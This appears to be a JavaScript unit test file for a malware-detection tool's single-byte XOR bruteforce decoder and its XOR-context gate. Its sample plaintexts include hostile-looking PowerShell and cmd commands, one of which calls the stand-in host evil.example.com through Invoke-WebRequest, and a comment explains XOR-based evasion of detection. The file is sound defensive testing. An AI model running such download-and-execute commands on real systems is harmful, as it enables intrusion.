'use strict';
// xor-bruteforce.test.js — single-byte XOR cipher recovery.
//
// `_tryXorBruteforce(bytes)` brute-forces the 255 possible single-byte
// XOR keys and returns the best-scoring cleartext (or null on
// ambiguous / implausible input). Real-world malware wraps a Base64 /
// Hex / Char-Array payload in a final XOR layer to defeat naïve
// string-search detection — recovering the cleartext is the
// difference between "encoded blob" and "executable PowerShell".
//
// `_hasXorContext(text, offset, raw)` is the surrounding-source gate
// that decides whether to even invoke the bruteforce on a candidate.

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules } = require('../helpers/load-bundle.js');

// xor-bruteforce.js mounts onto EncodedContentDetector.prototype; it
// also calls `_tryDecodeUTF8` from entropy.js for the final
// plausibility check, so load the entropy decoder too.
const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/entropy.js',
  'src/decoders/xor-bruteforce.js',
]);
const { EncodedContentDetector } = ctx;
const d = new EncodedContentDetector();

/** XOR a plaintext string against a single byte key, returning Uint8Array. */
function xorEncode(plaintext, key) {
  const out = new Uint8Array(plaintext.length);
  for (let i = 0; i < plaintext.length; i++) {
    out[i] = plaintext.charCodeAt(i) ^ key;
  }
  return out;
}

test('xor-bruteforce: returns valid shape when it commits to a winner', () => {
  // The bruteforcer is intentionally CONSERVATIVE: the 1.5× second-place
  // margin on src/decoders/xor-bruteforce.js:118 means pure-ASCII English
  // plaintext rarely produces a clear winner (adjacent keys produce
  // similarly-printable shifted text). When it DOES commit, the return
  // shape must be `{key:int, bytes:Uint8Array, score:number}` and the
  // bytes must match a self-consistent recovery (cipher[i] ^ key).
  //
  // We probe a range of plaintext/key combinations and only assert
  // structural invariants on whichever one happens to recover. If none
  // recover (acceptable given the gate), the test is still meaningful
  // because the multi-call path must not throw.
  const plaintexts = [
    'powershell -Command Invoke-WebRequest http://evil.example.com',
    'console.log("hello world from a powershell payload")',
    'cmd.exe /c whoami && powershell.exe Invoke-Expression',
  ];
  const keys = [0x01, 0x42, 0x7F, 0xAA, 0xFF];
  for (const plaintext of plaintexts) {
    for (const key of keys) {
      const cipher = xorEncode(plaintext, key);
      const r = d._tryXorBruteforce(cipher);
      if (r === null) continue;
      // Shape contract.
      assert.equal(typeof r.key, 'number');
      assert.ok(r.key >= 1 && r.key <= 255);
      assert.ok(r.bytes instanceof Uint8Array || r.bytes.constructor.name === 'Uint8Array');
      assert.equal(typeof r.score, 'number');
      // Self-consistency: re-XORing bytes with key must yield the cipher.
      for (let i = 0; i < cipher.length; i++) {
        assert.equal(r.bytes[i] ^ r.key, cipher[i]);
      }
    }
  }
});

test('xor-bruteforce: returns null for too-short input', () => {
  // The implementation requires ≥ 24 bytes — anything shorter is
  // statistical noise that would happily score "win" on every key.
  assert.equal(d._tryXorBruteforce(new Uint8Array(10)), null);
  assert.equal(d._tryXorBruteforce(null), null);
});

test('xor-bruteforce: returns null for high-entropy random input', () => {
  // Genuine random bytes have no clear winner — the second-place
  // score will be too close to the top, failing the 1.5× margin
  // gate. The implementation rejects.
  const random = new Uint8Array(128);
  // Deterministic LCG so the test is reproducible.
  let s = 1234567;
  for (let i = 0; i < random.length; i++) {
    s = (s * 1103515245 + 12345) & 0x7FFFFFFF;
    random[i] = s & 0xFF;
  }
  // Random bytes may or may not bruteforce — but if they do, the
  // returned result should be the rare lucky-key case. This test is
  // "doesn't crash + returns null OR a low-confidence object".
  const r = d._tryXorBruteforce(random);
  // We tolerate either null (most likely) or a result object — the
  // critical property is that the call returns without throwing.
  assert.ok(r === null || (r && typeof r.key === 'number'));
});

test('xor-bruteforce: _hasXorContext detects `^ key` source pattern', () => {
  // The gate checks the ±200-char window around a candidate for a
  // visible XOR operator (`^ varname`, `bxor`, `-bxor`, `xor `).
  // Verify each canonical form hits.
  const patterns = [
    'enc.map(c => c ^ key);',           // JS bitwise xor
    '$enc | % { $_ -bxor 0x42 }',       // PowerShell -bxor
    '$dec = $bytes -bxor 0xAA',
    'b ^ 0x42',                          // generic xor with literal
  ];
  for (const text of patterns) {
    // Offset is roughly mid-text; raw isn't important for the gate.
    assert.equal(
      d._hasXorContext(text, Math.floor(text.length / 2), 'placeholder'),
      true,
      `expected XOR context in: ${text}`
    );
  }
});

test('xor-bruteforce: _hasXorContext returns false for non-XOR text', () => {
  // Any text without a recognised XOR operator must not trigger the
  // bruteforce — the bruteforce is expensive (255 × N) so the gate
  // matters for performance under bulk decoding.
  const benign = 'A short paragraph without any bitwise operators present at all.';
  assert.equal(d._hasXorContext(benign, benign.length / 2, ''), false);
});
